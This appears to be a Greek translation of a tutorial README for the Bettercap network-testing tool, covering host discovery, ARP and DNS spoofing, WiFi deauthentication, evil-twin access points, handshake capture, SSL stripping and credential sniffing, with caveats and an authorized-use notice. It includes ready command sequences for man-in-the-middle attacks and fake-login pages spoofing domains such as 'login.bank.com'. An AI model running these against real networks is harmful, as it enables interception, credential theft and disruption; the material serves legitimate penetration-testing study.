# 🦈 Bettercap — Οδηγός ελέγχων ασφάλειας δικτύων

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
  ██████╗ ███████╗████████╗████████╗███████╗██████╗  ██████╗ █████╗ ██████╗ 
  ██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗
  ██████╔╝█████╗     ██║      ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
  ██╔══██╗██╔══╝     ██║      ██║   ██╔══╝  ██╔══██╗██║     ██╔══██║██╔═══╝ 
  ██████╔╝███████╗   ██║      ██║   ███████╗██║  ██║╚██████╗██║  ██║██║     
  ╚═════╝ ╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     
            Επιμέρους εργαλεία ελέγχων ασφάλειας δικτύων
```

<p align="center">
  <img src="https://img.shields.io/badge/Bettercap-MITM-blue?style=for-the-badge" alt="Bettercap">
  <img src="https://img.shields.io/badge/WiFi-Attacks-red?style=for-the-badge" alt="WiFi">
  <img src="https://img.shields.io/badge/Network-Recon-green?style=for-the-badge" alt="Network">
</p>

---

## Πριν ξεκινήσετε

Το **Bettercap** οργανώνει ελέγχους δικτύου σε **modules** (επιμέρους λειτουργίες). Άλλες λειτουργίες αφορούν ενσύρματο IPv4/IPv6, άλλες WiFi ή Bluetooth. Δεν απαιτούν όλες την ίδια κάρτα ή το ίδιο είδος πρόσβασης. Η συνηθισμένη σύνδεση WiFi ως πελάτης διαφέρει από monitor mode και packet injection.

**Βασικοί όροι:** MITM = ενδιάμεση θέση σε μια επικοινωνία, ARP = αντιστοίχιση IPv4 με MAC στο τοπικό δίκτυο, DNS = αντιστοίχιση ονομάτων με διευθύνσεις, sniffer = καταγραφή πακέτων, proxy = διαμεσολαβητής, TLS = κρυπτογράφηση και ταυτοποίηση σύνδεσης, caplet = αρχείο εντολών Bettercap, Web UI = διεπαφή browser. Το σύμβολο » των παραδειγμάτων είναι προτροπή του Bettercap, όχι μέρος της εντολής προς επικόλληση.

Η ενεργοποίηση ενός module δεν αποδεικνύει ότι υπάρχει MITM ή ότι η κρυπτογράφηση αφαιρέθηκε. Ακολουθήστε την πραγματική διαδρομή των πακέτων σε δικό σας εργαστήριο ή ρητά εγκεκριμένο δίκτυο. Τα αρχικά παραδείγματα διατηρούνται· δεν εκτελείται καμία εντολή δικτύου κατά τη μετάφραση.

## 📋 Περιεχόμενα

- [Τι είναι το Bettercap](#section-01)
- [Εγκατάσταση](#section-02)
- [Βασική χρήση](#section-03)
- [Συλλογή πληροφοριών δικτύου](#section-04)
- [Αλλοίωση ARP και ενδιάμεση θέση στην επικοινωνία (MITM)](#section-05)
- [Παραποίηση απαντήσεων DNS (DNS Spoofing)](#section-06)
- [Έλεγχοι WiFi](#section-07)
- [Υποβάθμιση HTTPS και περιορισμοί](#section-08)
- [Καταγραφή και αναζήτηση στοιχείων πρόσβασης](#section-09)
- [Caplets](#section-10)
- [Διεπαφή web](#section-11)
- [Γρήγορη αναφορά](#section-12)
- [Πλαίσιο εξουσιοδοτημένης χρήσης](#section-13)
- [Πηγές](#section-14)

---

<a id="section-01"></a>

## 🎯 Τι είναι το Bettercap

**Bettercap** είναι πλαίσιο ελέγχων WiFi, Bluetooth και ενσύρματων δικτύων με επιμέρους modules. Είναι διαφορετικό έργο από το Ettercap και προσφέρει:

- 🔍 **Συλλογή πληροφοριών δικτύου** — αναζήτηση hosts και υπηρεσιών
- 🎭 **Δοκιμές MITM** — αλλοίωση ARP και DNS
- 📶 **Έλεγχοι WiFi** — πλαίσια αποσύνδεσης, μη γνήσιο AP και καταγραφή handshake
- 🔓 **Καταγραφή στοιχείων πρόσβασης** — σε αναγνώσιμη κίνηση HTTP, με περιορισμούς για HTTPS
- 📡 **Bluetooth/BLE** — αναζήτηση συσκευών και επιμέρους δοκιμές
- 🌐 **Διεπαφή web** — διαχείριση μέσω browser

### Δυνατότητες

| Χαρακτηριστικό | Περιγραφή |
| --------- | ------------- |
| **Οργάνωση σε επιμέρους modules** | Επεκτάσιμο μέσω αρχείων caplet |
| **Διαδραστικό** | Διαδραστικό περιβάλλον εντολών σε πραγματικό χρόνο |
| **Χρήση σε scripts** | Αυτοματοποίηση μέσω αρχείων caplet |
| **Διεπαφή web** | Διεπαφή μέσω browser |
| **Γλώσσα Go** | Εργαλείο Go με υποστήριξη πολλών πλατφορμών |

---

<a id="section-02"></a>

## 🚀 Εγκατάσταση

### Kali Linux (συνήθως προεγκατεστημένο)

```bash
# Ενδέχεται να υπάρχει ήδη στο αντίστοιχο πακέτο Kali
bettercap --help

# Ενημέρωση
sudo apt update && sudo apt install bettercap
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install bettercap
```

### Εγκατάσταση από πηγαίο κώδικα

```bash
# Πρώτα εγκατάσταση Go
sudo apt install golang

# Εγκατάσταση Bettercap
go install github.com/bettercap/bettercap@latest

# Εναλλακτικά
git clone https://github.com/bettercap/bettercap
cd bettercap
make build
sudo make install
```

### Προαιρετική εγκατάσταση διεπαφής

```bash
# Λήψη διεπαφής web
sudo bettercap -eval "caplets.update; ui.update; quit"
```

---

<a id="section-03"></a>

## 💻 Βασική χρήση

> **Περιβάλλον εντολών:** Οι εντολές με σύμβολο » εκτελούνται μέσα στο Bettercap και οι εξωτερικές sudo εντολές σε κατάλληλο shell. Ονόματα modules, μεταβλητές και caplets αλλάζουν ανά έκδοση. Μην θεωρείτε ότι κάθε παράμετρος του πρωτοτύπου υποστηρίζεται.


### Εκκίνηση Bettercap

```bash
# Βασική εκκίνηση με τα απαιτούμενα δικαιώματα
sudo bettercap

# Ορισμός διεπαφής
sudo bettercap -iface eth0
sudo bettercap -iface wlan0

# Μη διαδραστική εκτέλεση εντολών
sudo bettercap -eval "net.probe on; net.show"

# Φόρτωση αρχείου caplet
sudo bettercap -caplet http-ui
```

### Διαδραστικό περιβάλλον εντολών

```bash
# Μέσα στο περιβάλλον εντολών Bettercap
» help                      # Εμφάνιση όλων των εντολών
» help net.probe            # Βοήθεια συγκεκριμένου module
» net.show                  # Εμφάνιση hosts που εντοπίστηκαν
» set arp.spoof.targets X   # Ορισμός μεταβλητής
» arp.spoof on              # Ενεργοποίηση module
» quit                      # Έξοδος
```

### Διαχείριση modules

```bash
# Προβολή: όλα τα modules
» help

# Πληροφορίες module
» help arp.spoof

# Ενεργοποίηση module
» arp.spoof on

# Απενεργοποίηση module
» arp.spoof off

# Εμφάνιση ρυθμίσεων module
» get arp.spoof.*
```

---

<a id="section-04"></a>

## 🔍 Συλλογή πληροφοριών δικτύου

> **Παρατήρηση και ενεργά probes διαφέρουν:** Το net.probe στέλνει δοκιμαστικά πακέτα. Οι passive/timeout/meta μεταβλητές του παραδείγματος χρειάζονται έλεγχο και δεν μετατρέπουν αυτόματα κάθε λειτουργία σε παθητική. Το net.sniff.output αποθηκεύει πακέτα· δεν εξάγει τη λίστα συσκευών του net.show.


### Εντοπισμός ενεργών συστημάτων (Host Discovery)

```bash
# Ενεργοποίηση ενεργών δοκιμαστικών πακέτων δικτύου
» net.probe on

# Εμφάνιση hosts που εντοπίστηκαν
» net.show

# Έξοδος:
┌─────────────────────────────────────────────────────────────┐
│ IP               MAC                Vendor            Seen  │
├─────────────────────────────────────────────────────────────┤
│ 192.168.1.1      AA:BB:CC:DD:EE:FF  TP-Link           5s    │
│ 192.168.1.100    11:22:33:44:55:66  Apple             2s    │
└─────────────────────────────────────────────────────────────┘
```

### Πληροφορίες δικτύου

```bash
# Εμφάνιση πληροφοριών δικτύου· δεν αποτελεί πλήρη απογραφή διεπαφών
» net.show

# Πληροφορίες διεπαφής
» get net.interface.*

# Πληροφορίες προεπιλεγμένης πύλης
» get gateway.*
```

### Επιλογές ενεργών δοκιμαστικών αιτημάτων

```bash
# Ορισμός περιορισμού ρυθμού ενεργών probes
» set net.probe.throttle 10

# Το πρωτότυπο αναφέρει παθητική λειτουργία· ελέγξτε αν υποστηρίζεται η παράμετρος
» set net.probe.passive true

# Ορισμός χρονικού ορίου probe κατά το πρωτότυπο
» set net.probe.timeout 500
```

### Εντολές συλλογής πληροφοριών

```bash
# Εκτενής συλλογή πληροφοριών
» net.recon on

# Καθαρισμός λίστας hosts
» net.clear

# Οι συγκεκριμένες ρυθμίσεις δεν είναι γενικό φίλτρο «μόνο ενεργοί hosts»
» set net.show.meta true
» net.show

# Καταγραφή πακέτων σε αρχείο· δεν εξάγει τη λίστα hosts
» set net.sniff.output /tmp/capture.pcap
» net.sniff on
```

---

<a id="section-05"></a>

## 🎭 Αλλοίωση ARP και ενδιάμεση θέση στην επικοινωνία (MITM)

> **Πραγματική ροή πακέτων:** Η αλλαγή ARP αφορά IPv4 στο σχετικό τοπικό δίκτυο. Απαιτούνται συμβατή τοπολογία και επιτυχής προώθηση κίνησης· η ενεργοποίηση module δεν αρκεί για να δηλώσετε MITM. Η ενδιάμεση θέση δεν αποκρυπτογραφεί αυτόματα TLS.


### Βασικό παράδειγμα αλλοίωσης ARP

```bash
# Εκκίνηση Bettercap
sudo bettercap -iface eth0

# Ενεργοποίηση ενεργών δοκιμαστικών αιτημάτων
» net.probe on

# Μετά την αναμονή, εμφάνιση hosts
» net.show

# Ορισμός δοκιμαστικού host
» set arp.spoof.targets 192.168.1.100

# Ενεργοποίηση αλλοίωσης ARP
» arp.spoof on

# Η ενδιάμεση θέση δεν είναι εγγυημένη· απαιτείται επιβεβαίωση της πραγματικής ροής
```

### Και οι δύο κατευθύνσεις επικοινωνίας

```bash
# Επηρεασμός δοκιμαστικού host και πύλης
» set arp.spoof.fullduplex true
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
```

### Παράδειγμα εφαρμογής σε υποδίκτυο

```bash
# Παράδειγμα επιλογής ολόκληρου υποδικτύου, πέρα από την πύλη
» set arp.spoof.targets 192.168.1.0/24
» arp.spoof on

# Μόνο μεταξύ εσωτερικών hosts, χωρίς επηρεασμό πύλης στο παράδειγμα
» set arp.spoof.internal true
» arp.spoof on
```

### Αλλοίωση ARP και καταγραφή πακέτων

```bash
# Συνδυαστικό παράδειγμα MITM
» net.probe on
» set arp.spoof.targets 192.168.1.100
» set arp.spoof.fullduplex true
» arp.spoof on
» net.sniff on
```

---

<a id="section-06"></a>

## 🌐 Παραποίηση απαντήσεων DNS (DNS Spoofing)

> **DNS δεν καταργεί την ταυτότητα TLS:** Ο πελάτης πρέπει να λάβει και να δεχτεί την επηρεασμένη απόκριση DNS. Κρυπτογραφημένο DNS και διαφορετική διαδρομή αιτημάτων μπορεί να μην επηρεάζονται. Ανακατεύθυνση IP δεν δημιουργεί έγκυρο πιστοποιητικό για το αρχικό όνομα ιστοτόπου.


### Βασικό παράδειγμα αλλοίωσης DNS

```bash
# Ορισμός ονομάτων για τις δοκιμές DNS
» set dns.spoof.domains example.com, *.example.com

# Ορισμός διεύθυνσης ανακατεύθυνσης στο σύστημα ελέγχου
» set dns.spoof.address 192.168.1.50

# Ενεργοποίηση στο συγκεκριμένο σενάριο με προηγούμενο ARP spoof
» arp.spoof on
» dns.spoof on
```

### Παράδειγμα επηρεασμού όλων των ονομάτων DNS

```bash
# Χαρακτήρας μπαλαντέρ για όλα τα ονόματα DNS
» set dns.spoof.domains *
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Πολλαπλά domains

```bash
# Λίστα domains
» set dns.spoof.domains facebook.com, *.facebook.com, twitter.com, *.twitter.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

### Αλλοίωση DNS με server HTTP

```bash
# Συνδυαστικό εργαστηριακό παράδειγμα DNS και δοκιμαστικού ιστοτόπου
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on

# Εκκίνηση HTTP server στο σύστημα ελέγχου
» set http.server.path /var/www/phishing
» http.server on
```

---

<a id="section-07"></a>

## 📶 Έλεγχοι WiFi

> **Εξαρτάται από module και driver:** Χρειάζονται κατάλληλη monitor mode και υποστήριξη ενεργών εκπομπών. Το wifi.ap εκπέμπει δοκιμαστικά management beacons· δεν ισοδυναμεί από μόνο του με πλήρη λειτουργικό AP. Οι wifi.deauth.station/repeat και wifi.show.wpa του πρωτοτύπου χρειάζονται επιβεβαίωση. Δείτε το [επίσημο module WiFi](https://www.bettercap.org/modules/wifi/).


### Ενεργοποίηση λειτουργιών WiFi

```bash
# Εκκίνηση με ασύρματη διεπαφή
sudo bettercap -iface wlan0

# Ενεργοποίηση συλλογής πληροφοριών WiFi
» wifi.recon on

# Εμφάνιση σημείων πρόσβασης που εντοπίστηκαν
» wifi.show
```

### Συλλογή πληροφοριών WiFi

```bash
# Εμφάνιση σημείων πρόσβασης που έχουν παρατηρηθεί
» wifi.show

# Έξοδος:
┌───────────────────────────────────────────────────────────────────┐
│ RSSI  BSSID              Ch  Enc     ESSID               Clients │
├───────────────────────────────────────────────────────────────────┤
│ -45   AA:BB:CC:DD:EE:FF   6  WPA2    HomeNetwork              3  │
│ -60   11:22:33:44:55:66   1  WPA2    Office_WiFi              1  │
└───────────────────────────────────────────────────────────────────┘
```

### Δοκιμή πλαισίων αποσύνδεσης

```bash
# Δοκιμή αποσύνδεσης πελατών συγκεκριμένου AP
» wifi.deauth AA:BB:CC:DD:EE:FF

# Δοκιμή αποσύνδεσης συγκεκριμένου πελάτη
» set wifi.deauth.station 11:22:33:44:55:66
» wifi.deauth AA:BB:CC:DD:EE:FF

# Αδιάκοπη επανάληψη αποσυνδέσεων κατά το πρωτότυπο
» set wifi.deauth.repeat 100
» wifi.deauth AA:BB:CC:DD:EE:FF
```

### Καταγραφή handshake

> **Αρχείο ή κατάλογος:** Το wifi.handshakes.file είναι διαδρομή αρχείου pcap στην τυπική λειτουργία συγκέντρωσης. Η τιμή που τελειώνει σε κάθετο του πρωτοτύπου δεν είναι γενικά σωστή επιλογή αρχείου. Ελέγξτε τη ρύθμιση aggregate. Handshake ή PMKID δεν είναι αποθηκευμένος κωδικός.


```bash
# Ενεργοποίηση συλλογής πληροφοριών WiFi
» wifi.recon on

# Ορισμός ίδιου καναλιού με τον στόχο
» wifi.recon.channel 6

# Καταγραφή handshakes
» set wifi.handshakes.file /tmp/handshakes/

# Δοκιμή πρόκλησης επανασύνδεσης, χωρίς εγγύηση επιτυχίας
» wifi.deauth AA:BB:CC:DD:EE:FF

# Έλεγχος διαθέσιμων καταγραφών handshake
» wifi.show.wpa
```

### Παράδειγμα μη γνήσιου σημείου πρόσβασης (evil twin)

> **Η σύνδεση δεν είναι αυτόματη:** Ίδιο SSID ή BSSID δεν εγγυάται ότι ο πελάτης θα συνδεθεί στο δοκιμαστικό AP. Τύπος ασφάλειας, αποθηκευμένο προφίλ και έλεγχοι του πελάτη επηρεάζουν την επιλογή. Το αρχικό παράδειγμα δεν είναι πλήρης υλοποίηση υποδομής AP.


```bash
# Παράδειγμα αντιγραφής χαρακτηριστικών σημείου πρόσβασης
» set wifi.ap.ssid "Free WiFi"
» set wifi.ap.bssid AA:BB:CC:DD:EE:FF
» set wifi.ap.channel 6
» set wifi.ap.encryption false

# Εκκίνηση δοκιμαστικού μη γνήσιου AP
» wifi.ap on

# Δοκιμή αποσύνδεσης από το πραγματικό AP· δεν εγγυάται μετάβαση πελατών στο άλλο AP
» wifi.deauth <real_AP_BSSID>
```

### Έλεγχος PMKID

```bash
# Παράδειγμα που μπορεί να μη χρειάζεται ήδη συνδεδεμένο πελάτη
» wifi.recon on
» wifi.assoc AA:BB:CC:DD:EE:FF

# Ενδεικτική αποθήκευση PMKID σύμφωνα με τη ρύθμιση του εργαλείου
» wifi.show.wpa
```

---

<a id="section-08"></a>

## 🔒 Υποβάθμιση HTTPS και περιορισμοί

> **Το HSTS δεν παρακάμπτεται απλώς με sslstrip:** Ο browser που ήδη γνωρίζει σχετική πολιτική HSTS ή την έχει προφορτωμένη επιβάλλει ασφαλή σύνδεση. TLS proxy χρειάζεται την κατάλληλη εμπιστοσύνη πιστοποιητικού από τον εργαστηριακό client· διαφορετικά αναμένονται σφάλματα. Δείτε [RFC 6797](https://www.rfc-editor.org/rfc/rfc6797.html) και το [module HTTPS proxy](https://www.bettercap.org/modules/ethernet/proxies/httpsproxy/).


### SSL stripping και περιορισμοί HSTS

```bash
# Πρώτα ενεργοποίηση αλλοίωσης ARP στο εργαστηριακό σενάριο
» arp.spoof on

# Ενεργοποίηση επιλογής SSL stripping του πρωτοτύπου
» set https.proxy.sslstrip true
» https.proxy on

# Εναλλακτικά, χρήση HTTP proxy
» http.proxy on
```

### Διαμεσολαβητής HTTPS

```bash
# Ρύθμιση διαμεσολαβητή HTTPS
» set https.proxy.address 0.0.0.0
» set https.proxy.port 8080
» https.proxy on

# Με επιλεγμένο πιστοποιητικό
» set https.proxy.certificate /path/to/cert.pem
» set https.proxy.key /path/to/key.pem
» https.proxy on
```

### Καταγραφή κίνησης HTTPS και περιορισμοί

```bash
# Παράδειγμα MITM· δεν αποκρυπτογραφεί αυτόματα κάθε HTTPS σύνδεση
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on
```

---

<a id="section-09"></a>

## 🔓 Καταγραφή και αναζήτηση στοιχείων πρόσβασης

> **Η ορατότητα περιορίζεται από την κρυπτογράφηση:** Η καταγραφή πακέτων δεν εμφανίζει από μόνη της μυστικά μέσα σε σωστά προστατευμένο HTTPS. Η θύρα 80 δεν αποδεικνύει ότι το περιεχόμενο περιέχει στοιχεία πρόσβασης. Τα αποθηκευμένα captures μπορεί να περιέχουν δεδομένα των εγκεκριμένων δοκιμών.


### Στοιχεία πρόσβασης σε HTTP

```bash
# Ενεργοποίηση καταγραφής πακέτων
» net.sniff on

# Συμπερίληψη τοπικής κίνησης στην καταγραφή
» set net.sniff.local true
» net.sniff on

# Φίλτρο κίνησης στη συνήθη θύρα HTTP
» set net.sniff.filter "tcp port 80"
» net.sniff on
```

### Συλλογή στοιχείων ταυτοποίησης

```bash
# Συνδυαστικό παράδειγμα παρατήρησης στοιχείων σε αναγνώσιμη κίνηση
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set https.proxy.sslstrip true
» https.proxy on
» net.sniff on

# Πιθανά στοιχεία εμφανίζονται μόνο αν υπάρχουν σε αναγνώσιμη κίνηση
```

### Αποθήκευση σε αρχείο

```bash
# Αποθήκευση καταγεγραμμένων πακέτων
» set net.sniff.output /tmp/capture.pcap
» net.sniff on

# Αναλυτική έξοδος
» set net.sniff.verbose true
» net.sniff on
```

---

<a id="section-10"></a>

## 📜 Caplets

### Τι είναι τα caplets;

Τα caplets είναι αρχεία εντολών, συνήθως με κατάληξη .cap, για αυτοματοποίηση του Bettercap. Διαφέρουν από τα αρχεία καταγραφής πακέτων που μπορεί επίσης να έχουν κατάληξη .cap.

### Έτοιμα caplets

```bash
# Καταγραφή caplets
» caplets.show

# Ενδεικτικά caplets:
- http-ui       # Διεπαφή web
- https-ui      # Διεπαφή web μέσω HTTPS
- local-sniffer # Καταγραφή τοπικής κίνησης
- mitm          # Βασική ρύθμιση σεναρίου MITM
- pita          # Αυτοματοποίηση δοκιμών WiFi
```

### Φόρτωση caplet

```bash
# Από τη γραμμή εντολών
sudo bettercap -caplet http-ui

# Μέσα στο περιβάλλον Bettercap
» caplet http-ui

# Από αρχείο
sudo bettercap -caplet /path/to/custom.cap
```

### Δημιουργία δικού σας caplet

```bash
# Αρχείο: my-mitm.cap
net.probe on
sleep 5
set arp.spoof.targets 192.168.1.100
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
set net.sniff.verbose true
```

```bash
# Εκτέλεση του επιλεγμένου caplet
sudo bettercap -caplet my-mitm.cap
```

### Ενημέρωση caplets

```bash
# Ενημέρωση caplets
» caplets.update
```

---

<a id="section-11"></a>

## 🌐 Διεπαφή web

> **Διαφορετικές υπηρεσίες:** Τα http-ui και https-ui μπορεί να χρησιμοποιούν διαφορετικό πρωτόκολλο και θύρα· ελέγξτε το πραγματικό caplet. Η ρύθμιση http.server δεν ταυτίζεται με credentials του REST API που χρησιμοποιεί η διεπαφή. User/pass είναι στοιχείο του πρωτοτύπου, όχι εγγυημένη σημερινή ρύθμιση. Το 0.0.0.0 ακούει σε όλες τις IPv4 διεπαφές. Δείτε τον [επίσημο οδηγό Web UI](https://www.bettercap.org/usage/web_ui/).


### Εκκίνηση διεπαφής web

```bash
# Πρώτα εγκατάσταση της διεπαφής
sudo bettercap -eval "caplets.update; ui.update; quit"

# Εκκίνηση διεπαφής web μέσω HTTP
sudo bettercap -caplet http-ui

# Εκκίνηση διεπαφής μέσω HTTPS
sudo bettercap -caplet https-ui

# Ενδεικτική διεύθυνση πρόσβασης: https://127.0.0.1:8080/
# Διαπιστευτήρια παραδείγματος: user/pass· ελέγξτε την πραγματική ρύθμιση
```

### Δυνατότητες διεπαφής web

| Χαρακτηριστικό | Περιγραφή |
| --------- | ------------- |
| **Dashboard** | Εμφάνιση πληροφοριών δικτύου σε πραγματικό χρόνο |
| **Συσκευές δικτύου** | Συσκευές που εντοπίστηκαν |
| **WiFi** | Ασύρματα δίκτυα |
| **BLE** | Συσκευές Bluetooth |
| **Συμβάντα** | Καταγραφή δραστηριότητας |
| **Πακέτα** | Καταγεγραμμένη κίνηση |

### Ρύθμιση διεπαφής web

```bash
# Ορισμός στοιχείων πρόσβασης
» set http.server.username admin
» set http.server.password secretpass

# Ορισμός θύρας
» set http.server.port 8080

# Διεύθυνση στην οποία ακούει η υπηρεσία
» set http.server.address 0.0.0.0
```

---

<a id="section-12"></a>

## 📊 Γρήγορη αναφορά

### Βασικές εντολές

| Εντολή | Περιγραφή |
| --------- | ------------- |
| `net.probe on` | Έναρξη αναζήτησης hosts |
| `net.show` | Εμφάνιση hosts που εντοπίστηκαν |
| `arp.spoof on` | Ενεργοποίηση αλλοίωσης ARP |
| `net.sniff on` | Έναρξη καταγραφής πακέτων |
| `dns.spoof on` | Ενεργοποίηση αλλοίωσης DNS |
| `wifi.recon on` | Έναρξη αναζήτησης WiFi |
| `wifi.deauth BSSID` | Δοκιμή πλαισίων deauthentication |
| `https.proxy on` | Ενεργοποίηση διαμεσολαβητή HTTPS |

### Συνήθεις μεταβλητές

| Μεταβλητή | Περιγραφή |
| ---------- | ------------- |
| `arp.spoof.targets` | Επιλεγμένοι δοκιμαστικοί hosts |
| `arp.spoof.fullduplex` | Επηρεασμός και των δύο κατευθύνσεων |
| `dns.spoof.domains` | Domains των οποίων οι αποκρίσεις DNS θα επηρεαστούν |
| `dns.spoof.address` | Διεύθυνση IP ανακατεύθυνσης |
| `net.sniff.output` | Αρχείο εξόδου PCAP |
| `wifi.ap.ssid` | Όνομα δοκιμαστικού μη γνήσιου σημείου πρόσβασης |

### Υπόδειγμα ενδιάμεσης θέσης επικοινωνίας (MITM)

```bash
# Βασικό παράδειγμα ενδιάμεσης θέσης MITM
sudo bettercap -iface eth0 -eval "
net.probe on;
sleep 3;
set arp.spoof.targets 192.168.1.100;
set arp.spoof.fullduplex true;
arp.spoof on;
net.sniff on"
```

### Υπόδειγμα δοκιμής WiFi

```bash
# Παράδειγμα αποσύνδεσης και καταγραφής WiFi
sudo bettercap -iface wlan0 -eval "
wifi.recon on;
sleep 5;
wifi.deauth AA:BB:CC:DD:EE:FF"
```

### Συνδυαστικό παράδειγμα DNS και δοκιμαστικής ιστοσελίδας

```bash
# Αλλοίωση DNS και δοκιμαστικός ιστότοπος
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on
» set dns.spoof.domains login.bank.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
» set http.server.path /var/www/fake-login
» http.server on
```

---

<a id="section-13"></a>

## ⚠️ Πλαίσιο εξουσιοδοτημένης χρήσης

```
⚠️ Το Bettercap μπορεί να καταγράφει ή να επηρεάζει
δικτυακή κίνηση. Χρησιμοποιήστε το σε δικά σας εργαστήρια ή με
ρητή γραπτή άδεια ελέγχου.

✅ Εξουσιοδοτημένες δοκιμές διείσδυσης
✅ Έρευνα ασφάλειας σε εργαστήριο
✅ Εκπαιδευτική χρήση

❌ Η μη εξουσιοδοτημένη υποκλοπή μπορεί να επιφέρει νομικές κυρώσεις
❌ Όχι χρήση σε δημόσια δίκτυα χωρίς άδεια
❌ Όχι κλοπή στοιχείων πρόσβασης
```

---

<a id="section-14"></a>

## 📚 Πηγές

- [Επίσημος ιστότοπος Bettercap](https://www.bettercap.org/)
- [Αποθετήριο Bettercap](https://github.com/bettercap/bettercap)
- [Τεκμηρίωση Bettercap](https://www.bettercap.org/modules/)
- [Caplets](https://github.com/bettercap/caplets)

### Σχετικοί οδηγοί
- [Aircrack-ng](../../Aircrack-ng/translations/README.el.md)
- [Wifite](../../Wifite/translations/README.el.md)
- [Wireshark](../../Wireshark/translations/README.el.md)

---

<p align="center">
  <b>🦈 Κατανοήστε τη συμπεριφορά των δικτύων!</b><br>
  <i>Bettercap — επιμέρους λειτουργίες αξιολόγησης δικτύων</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
